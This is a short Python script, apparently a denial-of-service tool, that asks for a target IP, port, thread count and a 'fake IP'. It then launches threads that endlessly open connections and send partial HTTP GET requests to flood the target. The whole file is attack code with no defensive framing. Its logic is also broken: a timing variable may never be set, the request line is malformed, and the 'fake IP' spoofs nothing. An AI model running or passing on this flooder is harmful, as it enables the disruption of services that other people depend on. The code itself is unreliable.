import threading
import socket
import random
import time

    
ip=input("Enter the IP: ")
fake_ip=input("Enter your fake IP: ")
port=int(input("Enter the desired port: "))
threads=int(input("Enter the number of threads: "))

global ttl1
ttl1=time.time()

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s.connect((ip,1))
    s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,1))
    s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,1))
except TimeoutError:
    global t1
    t1=time.time()

ttl = int(t1 - ttl1)

def slow(ip, port, thread):
    c=0
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,port))
        s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,port))
        c=c+1
        print(f"Sent {c} packets to port {port} via thread {thread}")
        time.sleep(ttl-1)
        s.close()

for thread in range(threads):
    threading.Thread(target=slow, args=(ip,port,thread)).start()
